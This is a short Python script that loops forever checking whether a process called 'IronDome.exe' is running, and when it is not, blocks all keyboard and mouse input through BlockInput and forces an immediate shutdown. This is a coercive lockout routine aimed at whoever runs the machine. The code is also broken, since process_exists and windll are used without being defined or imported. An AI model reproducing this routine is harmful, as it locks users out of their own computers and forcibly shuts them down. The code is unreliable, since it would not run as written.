import subprocess
import os
import time


def check():
    while 1 == 1:
        if process_exists('IronDome.exe') == False:
            ok = windll.user32.BlockInput(True) #enable block
            time.sleep(3)
            os.system("shutdown /s /t 1");







check()
